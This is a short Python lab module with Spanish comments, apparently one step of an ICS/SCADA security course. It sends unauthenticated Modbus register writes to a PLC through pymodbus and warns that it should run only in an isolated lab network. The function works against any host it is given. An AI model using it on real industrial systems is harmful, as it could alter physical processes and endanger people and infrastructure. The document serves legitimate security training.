"""Escritura Modbus no autorizada (Bloque D, Paso 14).

ADVERTENCIA DE MANEJO: este módulo reproduce la técnica de ataque real más
común contra ICS/SCADA — comandos de control no autenticados, posible porque
Modbus no tiene autenticación nativa (es la misma clase de técnica usada en
ataques reales a infraestructura, tipo Stuxnet). Correr solo dentro de la red
Docker aislada sin salida a internet (Bloque G) o contra un PLCVirtual de
laboratorio propio, nunca contra un objetivo real.

No usa scapy: es una escritura Modbus perfectamente válida a nivel de
protocolo (function code 06), simplemente sin ninguna autorización previa —
no hace falta craftear paquetes crudos para explotar la falta de
autenticación de Modbus, alcanza con ser un cliente TCP más.
"""

from pymodbus.client import AsyncModbusTcpClient


async def escribir_registro_no_autorizado(
    host: str, puerto: int, direccion: int, valor: int, slave: int = 1
) -> bool:
    """Envía un comando Modbus write (function code 06) a `direccion` sin
    ninguna autenticación previa.

    Devuelve True si el PLC aceptó la escritura (no hubo excepción Modbus).
    """
    client = AsyncModbusTcpClient(host, port=puerto)
    await client.connect()
    try:
        respuesta = await client.write_register(address=direccion, value=valor, slave=slave)
        return not respuesta.isError()
    finally:
        client.close()
